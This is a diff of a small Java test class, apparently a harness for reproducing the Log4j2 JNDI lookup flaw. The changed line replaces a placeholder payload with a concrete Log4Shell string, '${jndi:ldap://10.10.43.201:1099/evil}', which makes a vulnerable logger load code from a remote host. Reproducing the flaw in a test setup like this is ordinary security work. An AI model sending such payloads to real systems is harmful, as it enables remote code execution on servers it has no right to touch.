@@ -12,7 +12,7 @@ public class TestMain {
         System.out.println("cn.zxf.log4j2.test.TestMain".length());
         System.out.println();
 
-        lookup("${jndi:ldap://ip:1389/#Exploit}");
+        lookup("${jndi:ldap://10.10.43.201:1099/evil}");
     }
 
     static void lookup(String info) {
